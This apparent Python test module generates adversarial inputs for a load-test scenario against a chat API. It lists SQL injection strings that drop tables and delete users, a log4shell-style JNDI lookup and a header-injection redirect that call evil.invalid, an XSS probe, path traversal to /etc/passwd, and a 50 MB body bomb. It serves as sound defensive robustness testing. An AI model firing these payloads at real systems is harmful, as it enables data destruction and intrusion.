# SPDX-License-Identifier: Apache-2.0
"""Hypothesis strategies for adversarial inputs.

Used by scenario S6 (Adversarial input storm).  All strategies are
``@composite`` so they can be combined inside Locust tasks without
fighting Hypothesis's example-database (which is irrelevant under
load; we just sample directly via ``strategy.example()``).

Categories:

1. Unicode RTL / NUL / ZWJ — Unicode trickery that historically caused
   truncation or rendering bugs in chat titles / message bodies.
2. Oversized payloads — 50 MB body bombs.  Must be rejected with 413,
   never accepted then OOM'd.
3. SQL injection probes — classic payloads in titles + message content.
   FastAPI + SQLAlchemy parameterised queries should be immune; any
   200 + reflected payload is a red flag, but the assertion that we
   care about is "the server stays responsive and the row count
   matches expectations".
4. Path traversal — ``../`` segments in folder names + file uploads.
5. Header injection — CR/LF in user-controlled values.

Each strategy returns a ``str`` (not bytes) so they slot into JSON
payloads cleanly.  Helpers ``rtl_sandwich``, ``oversized_body``,
``sql_probe``, ``path_traversal``, ``header_injection`` give direct
samples for use inside ``@task`` methods.

The marker string ``"allow-lmstudio-literal: adversarial-input"`` (per
``tools/check_no_lmstudio_fs.py`` convention) does NOT apply here — we
do not emit any ``~/.lmstudio/`` literal in adversarial strategies.
"""
from __future__ import annotations

import random
import string
from typing import Final

from hypothesis import strategies as st

# ---------------------------------------------------------------------------
# Unicode RTL / NUL / ZWJ
# ---------------------------------------------------------------------------

# Right-to-Left Override, Right-to-Left Mark, Zero-Width Joiner, BOM.
_RTL_CONTROLS: Final[tuple[str, ...]] = (
    "‮",  # RLO (right-to-left override)
    "‏",  # RLM
    "‍",  # ZWJ
    "‌",  # ZWNJ
    "﻿",  # BOM
    "⁦",  # LRI
    "⁧",  # RLI
    "⁨",  # FSI
    "⁩",  # PDI
)

# Surrogate-half codepoints that should be rejected by JSON encoders.
_SURROGATES: Final[tuple[str, ...]] = tuple(
    chr(cp) for cp in (0xD800, 0xD834, 0xDC00, 0xDFFF)
)

# A small ASCII alphabet for the "ordinary content surrounding the
# control char" portion.
_ALPHABET = string.ascii_letters + string.digits + " ."


def rtl_sandwich() -> str:
    """Return a string with RTL controls embedded in plausible content.

    Shape: 8 chars ASCII + 1–3 RTL controls + 8 chars ASCII + ``\\x00``.
    """
    head = "".join(random.choice(_ALPHABET) for _ in range(8))
    middle = "".join(random.choice(_RTL_CONTROLS) for _ in range(random.randint(1, 3)))
    tail = "".join(random.choice(_ALPHABET) for _ in range(8))
    # Append NUL — Pydantic strict mode strips this; some DBs choke.
    return head + middle + tail + "\x00"


def surrogate_half() -> str:
    """Return a single un-paired UTF-16 surrogate codepoint.

    JSON encoders should refuse to encode this; the server is expected
    to return 400 (or 422), not crash.
    """
    return random.choice(_SURROGATES)


# ---------------------------------------------------------------------------
# Oversized payloads
# ---------------------------------------------------------------------------


def oversized_body(target_mb: int = 50) -> str:
    """Return a string approximately ``target_mb`` megabytes long.

    Uses a fixed printable pattern so the request body compresses badly
    (defeats accidental gzip-based DoS amplification on the server side).
    Server is expected to 413 well before reading the whole body.
    """
    chunk = "A" * 1024  # 1 KiB
    return chunk * (target_mb * 1024)


# ---------------------------------------------------------------------------
# SQL injection probes
# ---------------------------------------------------------------------------

_SQL_PROBES: Final[tuple[str, ...]] = (
    "'; DROP TABLE chats; --",
    "' OR '1'='1",
    "1; SELECT pg_sleep(10); --",
    "\"; DELETE FROM users WHERE id <> 0; --",
    "' UNION SELECT password FROM users --",
    "%27%20OR%201%3D1--",
    "${jndi:ldap://evil.invalid/x}",  # log4shell-style, totally inert in Python
    "{{7*7}}",  # template-injection probe, inert in FastAPI
    "<script>alert(1)</script>",  # XSS probe; chats render as text
)


def sql_probe() -> str:
    """Return one canonical SQL/XSS/template-injection probe string."""
    return random.choice(_SQL_PROBES)


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

_TRAVERSAL_PROBES: Final[tuple[str, ...]] = (
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "valid/folder/../../../escape",
)


def path_traversal() -> str:
    """Return a path-traversal probe usable as a folder name."""
    return random.choice(_TRAVERSAL_PROBES)


# ---------------------------------------------------------------------------
# Header injection
# ---------------------------------------------------------------------------


def header_injection() -> str:
    """Return a string with embedded CRLF — must not split outgoing headers."""
    bases = (
        "Mozilla/5.0\r\nX-Injected: yes",
        "title\nLocation: http://evil.invalid/",
        "value\r\n\r\n<html>injected</html>",
    )
    return random.choice(bases)


# ---------------------------------------------------------------------------
# Hypothesis strategies — used by S6 to sample @task inputs.
# ---------------------------------------------------------------------------


@st.composite
def adversarial_title(draw: st.DrawFn) -> str:
    """Hypothesis strategy producing one adversarial chat-title string."""
    flavor = draw(st.sampled_from(["rtl", "sql", "traversal", "header"]))
    if flavor == "rtl":
        return rtl_sandwich()
    if flavor == "sql":
        return sql_probe()
    if flavor == "traversal":
        return path_traversal()
    return header_injection()


@st.composite
def adversarial_message(draw: st.DrawFn) -> str:
    """Hypothesis strategy producing one adversarial message-body string."""
    flavor = draw(st.sampled_from(["rtl", "sql", "surrogate", "long"]))
    if flavor == "rtl":
        return rtl_sandwich() * draw(st.integers(min_value=1, max_value=5))
    if flavor == "sql":
        return sql_probe()
    if flavor == "surrogate":
        return surrogate_half()
    # 'long' — not the 50MB monster (that's a separate task), but a
    # 64 KiB pseudo-message that exercises chunked-encoding paths.
    return "x" * (64 * 1024)
